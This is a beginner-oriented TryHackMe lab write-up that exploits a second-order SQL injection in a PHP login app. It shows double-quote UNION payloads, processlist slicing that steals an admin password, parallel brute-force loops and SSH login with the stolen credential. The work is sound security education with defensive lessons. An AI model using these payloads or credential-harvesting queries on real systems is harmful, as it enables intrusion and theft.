---
description: "TryHackMe Rabbit Hole — a four-page recruitment site that tells you twice, in its own HTML, that it has anti-bruteforce measures 'implemented with database queries'. Everything about the box invites you to attack the login, and almost everything about it is a dead end: the login really is parameterised, there is no lockout, and admin's password is not in 30,000 common passwords. The one bug is second-order SQL injection through the username — stored safely by a real prepared statement, then pasted into a second query built with string concatenation and delimited by DOUBLE quotes, which is why a single-quote probe says 'not vulnerable' and lies to you. The five-second login delay is not the defence, it is the exploit: it keeps the admin cron's own login query resident in information_schema.processlist long enough to read the password straight out of it. Every command, every flag explained for a total beginner, and every one of my wrong turns kept in — including the single character that cost me the whole engagement."
---

# Rabbit Hole — the one character that cost me the entire box

**TryHackMe · challenge: Rabbit Hole (`rabbitholeqq`) · target: `10.x.x.x` (the lab IP changes per lease)**

> **Flags are redacted in this write-up.** The commands, payloads, offsets, dead ends and reasoning
> are all here — those are what teach. The flag string itself teaches nothing; it is just proof you
> were there, and publishing it hands the room's answer to the next person instead of letting them
> earn it. The recovered admin password is truncated for the same reason.

**Answer:** `THM{[redacted]}` — read from `/home/admin/flag.txt` after logging in over SSH as
`admin`, using a password stolen out of the database's own list of running queries.

The room is called Rabbit Hole. It earns the name. I spent roughly four hours in it, killed one lab
machine, and brute-forced about 100,000 passwords against two user accounts **that did not exist**.
This write-up keeps all of that in, because the wrong turns are the lesson and a clean narrative
that hides them would be a lie about how the work went.

---

## What you need to know before we start

A few words that will come up constantly.

- A **port** is a numbered door on a machine. A program that wants to be reachable over the network
  sits behind one. Port 80 is the usual door for websites; port 22 is for SSH, a remote command line.
- **SQL** is the language a web application uses to ask its database questions, e.g.
  `SELECT * FROM users WHERE username = 'bob'`.
- **SQL injection (SQLi)** happens when the app pastes your input straight into that question instead
  of keeping it separate as *data*. Your input stops being a value and becomes part of the query, so
  you get to rewrite what the database is asked.
- A **prepared statement** is the correct defence: the app sends the query shape and the values
  separately, so a value can never become syntax. Watch carefully in this room for what a prepared
  statement is **not**.

---

## Recon — two ports, four pages, and three sentences that matter

### The port scan

```bash
nmap -sT -p- --min-rate 1000 -T4 -Pn -oN nmap-allports.txt 10.x.x.x
```

- `-sT` — **TCP connect scan**: make a normal, complete connection to each port. The faster `-sS`
  needs root privileges; on a session without passwordless `sudo`, `-sT` is the one that works.
  Knowing which of your tools need root *before* you queue a long job behind one saves a restart.
- `-p-` — every port from 1 to 65535, not just the ~1000 common ones. Services hide on odd ports.
- `--min-rate 1000` — send at least 1000 probes per second. `-T4` — aggressive timing.
- `-Pn` — skip the "is it alive?" check; `ping` already answered that.
- `-oN file` — write the output to a file as it goes. Evidence lands on disk while it is produced,
  not at the end when you might have lost it.

**Work the cost out before you launch anything long:** 65535 ports ÷ 1000 per second ≈ 70 seconds.
It finished in 5.77.

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Not shown: 65533 closed tcp ports (conn-refused)
```

That last line is worth as much as the two open ports. Every other port **actively refused** the
connection instead of silently dropping it, which means no firewall is swallowing my packets. So
"closed" really means closed, and "open" really means open. That is a free sanity check on my
instrument, and this room punishes anyone who does not check their instruments.

Then version detection on just those two ports:

```bash
nmap -sT -sV -sC -p22,80 -Pn -oN nmap-services.txt 10.x.x.x
```

`-sV` identifies the software and version behind each port; `-sC` runs nmap's default set of safe
information-gathering scripts.

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Your page title here :)
|     PHPSESSID:  httponly flag not set
```

`PHPSESSID` is PHP's session cookie, so this is a PHP application. The page title is the untouched
HTML template default — a hand-built lab app, not a product with public exploits. **Remember port 22.
It sits there unused for the entire engagement and turns out to be where the flag lives.**

### Read the site before poking it

```bash
curl -s -D index-headers.txt -o index.html http://10.x.x.x/
```

`curl` fetches a URL. `-s` = silent (no progress bar). `-D file` = save the response *headers*.
`-o file` = save the *body*. Headers confirmed `X-Powered-By: PHP/8.3.9`.

The whole site is four pages — `index.php`, `login.php`, `register.php`, `logout.php` — plus a `css/`
folder. There is **no JavaScript on the site at all**. So the entire client side is three HTML forms
and three sentences:

**Homepage:**
> Recruitment campaign: register here and login
> There are anti-bruteforce measures in place. Login functionality is actively monitored.

**`login.php`:**
> There are anti-bruteforce measures in place, implemented **with database queries**.

Those two versions of the same sentence are not identical, and the difference is deliberate. Hold on
to *"implemented with database queries"* — by the end it turns out to be a literal instruction rather
than the bait I spent hours treating it as.

### Content discovery, with controls

```bash
grep -viE '^(setup|install|reset|clear|block|seed|migrate|init|delete|drop|truncate|purge)$' \
  /usr/share/seclists/Discovery/Web-Content/common.txt > wordlist-safe.txt
printf 'login.php\n__definitely_not_here_5136\n' >> wordlist-safe.txt

ffuf -u http://10.x.x.x/FUZZ -w wordlist-safe.txt -t 25 -mc all -fc 404
```

`ffuf` requests a URL once per line of a wordlist, substituting each word for `FUZZ`. `-t 25` = 25
requests at a time (a 1-vCPU lab box falls over at 80). `-mc all -fc 404` = show every status code
*except* 404 Not Found.

Two details matter more than the tool:

- The `grep -viE` **strips destructive words out of the wordlist first**. A content sweep is not
  read-only — it sends a real request to every name it can think of, and a `GET /reset` will happily
  reset something.
- I appended a **positive control** (`login.php`, which I know exists) and a **negative control**
  (`__definitely_not_here_5136`, which cannot exist) to the same wordlist. If the positive control
  does not come back, the tool is broken and an empty result means nothing at all.

Positive control present, negative control absent → the sweep is trustworthy. Later I repeated this
with `raft-small-words` bare and with `.php`, then with `.txt/.sql/.zip/.tar.gz/.log/.bak/.json/.xml/.md`,
plus backup, swap-file, `.git` and `.env` names — about 130,000 requests in total. There is nothing
on this box but those four pages.

---

## The rabbit hole, part 1: the login form

### Getting a discriminator first

Register an account through the normal form, then find out what success and failure actually look
like — **positively**, not by looking for an error string (every error page in the world matches
"the failure string is absent"):

| attempt | status | body size |
|---|---|---|
| correct password | `302` redirect to `/` | 0 bytes |
| wrong password | `200` | 930 bytes (the form again) |

### Eight injection probes, and eight identical answers

I threw a single quote at `username`, at `password`, and at every HTTP header a PHP app uses to work
out the client's IP address (`X-Forwarded-For`, `Client-IP`, `X-Real-IP`, `User-Agent`).

**All eight came back byte-identical: `200`, 930 bytes.** That is silence, and silence is not
evidence — it means either "no injection" or "the app hides its errors". So I moved to a channel
that cannot hide: **time**. If my input reaches a MySQL query, `SLEEP(5)` makes the response take
five seconds longer.

```bash
curl -s -o /dev/null -w "%{time_total}s\n" -X POST \
  --data-urlencode "username=qqtester' AND SLEEP(5)-- -" \
  --data-urlencode "password=WRONGWRONG" -d 'login=Submit' http://10.x.x.x/login.php
```

```
control (no payload)      : 5.039935s
user  ' AND SLEEP(5)-- -  : 5.045137s
user  ' OR SLEEP(5)-- -   : 5.044447s
xff   ' AND SLEEP(5)-- -  : 5.042588s
control (no payload)      : 5.043540s
```

**The control took five seconds too.** My measuring instrument was broken before I read a single
result — and I only caught it because a control was in the run. This is the single most valuable
habit in this entire write-up: *a positive control and a negative control go in every run, and you
read the control rows before the result rows.*

### What the "anti-bruteforce measure" actually is

So I asked what the delay depends on, instead of assuming:

```
fail, no XFF header        : 5.043163s  200
fail, XFF=9.9.9.9          : 5.041092s  200
fail, unknown user 'zzz'   : 5.041124s  200
SUCCESS, correct creds     : 5.042861s  302   <- even success is slow
GET /login.php             : 0.039277s        <- only the POST is slow
POST /register.php         : 0.040723s
```

**It is a flat five-second `sleep` on every login POST**, success or failure. It is not a lockout and
it blocks nothing — it just makes each guess cost 5 seconds. So: does it survive concurrency?

```bash
for i in $(seq 1 12); do
  curl -s -o /dev/null -w "  #$i http=%{http_code} time=%{time_total}s\n" -X POST \
    --data-urlencode 'username=qqtester' --data-urlencode "password=WRONG$i" \
    -d 'login=Submit' http://10.x.x.x/login.php &
done
wait
```

The `&` puts each request in the background so all twelve are in flight at once; `wait` blocks until
they all return.

**Twelve attempts, about five seconds of wall clock — not sixty.** And the correct password still
worked afterwards, so twelve consecutive failures triggered no lockout, no block, no captcha.

That is a genuine lesson about defence: `sleep(5)` *feels* like protection because your own terminal
waits five seconds. But it blocks **one web server worker**, not the attacker. A real rate limit has
to *count* something in shared state — attempts per account, per IP, per hour — and then refuse.

### And this is where I fell in

The delay is defeated, there is no lockout, the app advertises anti-bruteforce — so obviously you
brute-force the admin account, right?

| accounts | list | candidates | result |
|---|---|---|---|
| admin | darkweb2017 top-1000 | 999 | nothing |
| admin | 10k-most-common | 10,000 | nothing |
| admin | themed (rabbit, wonderland, matrix, recruitment…) | 82 | nothing |
| admin | rockyou top 25,000, deduplicated against the above | 18,724 | nothing |
| admin | username-mangled and date-derived | ~1,500 | nothing |

Every run carried a positive control (an account whose password I knew, hidden in the same list) and
it hit every time, so the tool was working and these negatives are real.

I measured the ceiling too: about **15 guesses per second**, no matter how many connections I opened,
because the server only holds ~75 PHP workers and each is asleep for 5 seconds. At 15/s the full
`rockyou.txt` is **265 hours**. So the room cannot possibly intend a deep wordlist — and yet admin
survived the 30,000 most common passwords on earth.

**That should have stopped me an hour earlier than it did.** Guessing that fails across 30,000 of
the most likely candidates is evidence *the path is wrong*, not evidence you need a bigger wordlist.

---

## The rabbit hole, part 2: two users I invented myself

Registering a name that already exists returns a 20-byte body, `Something went wrong`, instead of the
usual `302`. That is a **username oracle** — you can ask "does this account exist?" one name at a
time. So I swept 412 common usernames and got back `admin`, `james` and `jobs`.

I then spent about **60,000 login attempts** brute-forcing `james` and `jobs`.

**Neither account ever existed.**

Two separate mistakes produced them, and both are worth more than the flag:

**1. The oracle writes to the population it is measuring.** Every *miss* creates the account. The
database's unique index is **case-insensitive**, so my own freshly-created `david` made a later
`David` in the same wordlist report "already exists". I checked for that and subtracted the
case-variants — but the subtraction only covered pairs inside my wordlist, so it was incomplete.

**2. `Something went wrong` is a catch-all, not a specific answer.** It means *duplicate key* — and
it also means *the database was too busy to accept this insert*. Under 20 concurrent connections the
second masquerades as the first.

What finally exposed it: the lab machine was redeployed, and on the fresh database I registered one
canary account and read the ID the app printed back:

```
<th>User 4 - zzprobe13636 last logins</th>
```

**User 4.** So at most three accounts could have existed before I touched anything. When a later
sweep reported *eight* existing accounts, the arithmetic caught the broken discriminator faster than
any re-probe could. Re-probing them one at a time, with no concurrency, gave the truth:

```
  admin            -> http=200 size=20   <- genuinely exists
  james            -> http=200 size=20   <- exists only because MY probe created it minutes earlier
  007              -> http=302           <- was free all along
  billy1           -> http=302
  ...
```

> **Rules worth stealing.** Register one canary and read the id it gets — that one request counts the
> seeded rows exactly and bounds every later claim. Enumerate the whole seed in one clean pass before
> your first write, because after that every reading is contaminated. And if a hit count exceeds what
> the system can physically contain, the discriminator is broken.

### I also knocked the machine over

At one point I had four password jobs running at once — roughly 110 connections into a server with
~75 workers, each held open by a five-second sleep. Every request started returning `http=000`, then
ICMP stopped, then ports 22 and 80 both refused. The instance was gone and had to be redeployed.

Worse, the measurements I took while it was struggling were **garbage that looked like findings**: a
baseline that read 0 bytes, 350 phantom "parameter hits" that all vanished on retest, a control whose
value changed. When results get strange, the first suspect is your own traffic — stop everything and
re-measure on a quiet box *before* interpreting anything.

---

## The bug: second-order SQL injection, and the character I got wrong

Here is the vulnerable code in `index.php`, the page that draws the "Last logins" table:

```php
while($row = $stmt->fetch()) {
  if ($row['username']===$_SESSION['username'] or $row['username']==='admin') {
    echo "<thead><th>User " . $row["id"] . " - " . $row['username'] . " last logins</th></thead>";
    $stmt_logins = $pdo->prepare(
        'SELECT * FROM logins where username ="' . $row['username'] . '" ORDER BY login_time DESC LIMIT 0,5');
    $stmt_logins->execute();
```

Two things to see.

**First: `prepare()` here is theatre.** The developer called the right function — on a string they had
*already built by concatenation*. A prepared statement only protects you if the values were never
part of the SQL text. Judge the way the string was **built**, not which function eventually received
it. `login.php` and `register.php` in this same app use real prepared statements and are genuinely
safe; this one is not.

**Second — and this is what cost me the engagement — the string is delimited with DOUBLE quotes:**
`where username ="..."`.

Earlier in the assessment I had this exact hypothesis. I tested it. I registered the username
`qq'zz`, logged in, watched the page render perfectly, and wrote off second-order injection.

A **single** quote is an ordinary, harmless character inside a double-quoted SQL string. **My probe
could never have produced a positive result.** The correct probe was one character different:

```bash
curl -s -X POST --data-urlencode 'username=test"user' \
  -d 'password=Zq9x!k&submit=Submit' http://10.x.x.x/register.php
# then log in as that user and load /
```

```
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax to use
near 'user" ORDER BY login_time DESC LIMIT 0,5' at line 1
```

**A negative result only counts if your probe was capable of producing a positive one.** Before you
write "not vulnerable", say out loud which delimiter you assumed — and then test the other one.

This is **second-order** (or *stored*) SQL injection: the username is saved perfectly safely by a real
prepared statement in `register.php`, and then pulled back out and pasted into a *different* query
later. The safe INSERT is exactly what makes it invisible to every first-order test.

### Getting data onto the page

The value displayed is `substr($rowg['login_time'],0,16)` — the second column of
`SELECT * FROM logins`, cut to **16 characters**. So a two-column `UNION` puts my data on screen. A
`UNION` glues the results of a second `SELECT` onto the first; it needs the same number of columns.

Register this as your username, then log in as it:

```
u1234a" union all select 1,2-- -
```

The page renders a row containing `2`. `-- -` is a SQL comment that throws away the rest of the
original query — including its `ORDER BY` and `LIMIT 0,5`, so I am not restricted to five rows.

```
u1234b" union all select 1,concat(version(),' ',database())-- -
  -> 11.4.2-MariaDB-u
```

MariaDB, and 16 characters per row is my bandwidth.

---

## The payoff: the delay is not the defence, it is the exploit

Now put together three facts that have been sitting in plain sight the whole time:

1. Something logs in as **`admin` every single minute** — you can watch it happen on the "Last logins"
   table, which is the app's advertised "monitoring".
2. Every login POST is held open for **five seconds**.
3. MariaDB has a table called `information_schema.processlist`, and its `info` column contains
   **the SQL statement each connection is currently executing**.

So once a minute there is a five-second window in which the admin's own login query — *with the
password inside it* — is sitting in a table I can now read.

The sentence the room repeats twice, *"anti-bruteforce measures... implemented with database
queries"*, was never bait. It was the instruction. **The delay that looks like the defence is the
thing that holds the credential still long enough to photograph it.**

First, check the app's database user can see other connections:

```
p1a" union all select 1,concat(user(),'|',(select count(*) from information_schema.processlist))-- -
  -> rabbit@172.18.0.
```

Yes. Now slice the query out 16 characters at a time. One payload unions ten slices at increasing
offsets, and filters out *its own* query — which necessarily contains the word `processlist`:

```
spy1234" union all select 1,substr(info,1,16)  from information_schema.processlist where info not like '%processlist%'
         union all select 1,substr(info,17,16) from information_schema.processlist where info not like '%processlist%'
         union all select 1,substr(info,33,16) from information_schema.processlist where info not like '%processlist%'
         ... ten slices, covering 160 characters ...
-- -
```

Register that string as a username and log in as it **once**. From then on every plain `GET /`
re-runs the query — no more writes, no tooling, just refresh in a loop until the admin's minute comes
around:

```bash
end=$(( $(date +%s) + 100 ))
while [ $(date +%s) -lt $end ]; do
  curl -s -b spy-cj.txt -o spy3.html http://10.x.x.x/
  if grep -q 'SELECT \* from us' spy3.html; then break; fi
done
```

It landed on the first minute. Because the ten slices return in payload order, the query reassembles
directly:

```
 1  SELECT * from us
 2  ers where (usern
 3  ame= 'admin' and
 4   password=md5('f
 5  [16 chars of password]
 6  [16 chars of password]
 7  [16 chars of password]
 8  [15 chars of password]'
 9  ) ) UNION ALL SE
10  LECT null,null,n
```

(Slices 5–8 are redacted: reassembled they *are* the admin password, and the admin password is the
flag. The shape is what matters — four full-width rows and a short one ending in the closing quote,
which is how you know where the value stops.)

```sql
SELECT * from users where (username= 'admin' and password=md5('f…0Q') ) ) UNION ALL SELECT null,null,n…
```

The admin's plaintext password is the string inside `md5(...)`: 64 characters, starting with the `f`
stranded at the end of slice 4 — `fEeFBqO…` *(truncated here; it is the prize, not the method)*.

> **One more decoy, right at the end.** That trailing `) ) UNION ALL SELECT null,null,null` is **not**
> part of the application's query — the room runs a *simulated attacker* against the login as well.
> So the thing you capture is not automatically genuine. Do not assume a stolen credential is real:
> test it, which is the only thing that settles it.

### Using it

```
web login as admin -> HTTP 302 (success)
```

…and the admin's page shows nothing new. No flag. But the same password works on **SSH** — which is
what port 22 has been waiting for since the first nmap scan:

```bash
sshpass -p '<64-char password>' ssh -o StrictHostKeyChecking=no admin@10.x.x.x 'id; ls -la ~'
```

```
uid=1002(admin) gid=118(admin) groups=118(admin)
-rw-r--r-- 1 root root 50 Jul 20  2024 flag.txt
```

```bash
cat /home/admin/flag.txt
```

**`THM{[redacted]}`**

---

## What this room is actually teaching

- **A delay is not a rate limit.** `sleep(5)` blocks one server worker, not the attacker; twelve
  parallel guesses cost the same as one. A real control counts attempts in shared state and refuses.
- **…and a delay can be worse than useless.** Here it is the whole vulnerability, because it holds a
  credential-bearing query resident in `information_schema.processlist` long enough to be read.
- **`prepare()` is not a synonym for safe.** Look at how the query string was *built*. Two of this
  app's three queries are genuinely parameterised; the third concatenates and then prepares.
- **Second-order injection hides behind a correct INSERT.** Input stored safely, then reused unsafely
  somewhere else, defeats every first-order test you run against the input point.
- **`information_schema.processlist` is a credential feed** whenever you have any SQL read primitive
  and a victim that authenticates on a timer. Reach for it early on any box with an automated login.

And the methodology lessons, which cost me far more than the technical ones:

- **A negative result is only worth the probe that produced it.** `qq'zz` could not have broken a
  double-quoted string. Name the assumption in your probe, then test its opposite.
- **Controls in every run, read before the results.** They caught a five-second "control" that
  silently invalidated my entire timing test.
- **An oracle that writes to what it measures poisons all its later readings.** Count the seed first
  with one canary; enumerate in one clean pass or not at all.
- **A generic error message is not a specific answer.** "Something went wrong" meant two different
  things, and under load the wrong one won.
- **One scanning job at a time against a small lab VM**, and when the target gets strange, suspect
  your own traffic before you believe a single number.
